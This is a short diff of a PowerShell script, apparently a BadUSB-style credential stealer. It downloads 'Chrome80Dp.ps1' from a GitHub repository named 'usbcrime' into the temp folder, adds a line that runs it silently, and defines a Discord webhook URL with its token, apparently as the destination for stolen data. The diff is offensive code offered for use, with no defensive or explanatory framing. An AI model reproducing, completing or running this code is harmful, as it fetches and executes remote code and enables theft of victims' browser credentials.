@@ -14,6 +14,7 @@ else{
 }
 $T=$env:temp
 iwr -Uri 'https://raw.githubusercontent.com/bindas88/usbcrime/main/Chrome80Dp.ps1' -o $T'\Chrome80Dp.ps1'
+Start-Process -FilePath $T"\Chrome80Dp.ps1" -ArgumentList "/S /v/qn" -Wait
 sleep 1
 $hookurl = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC"
 # shortened URL Detection
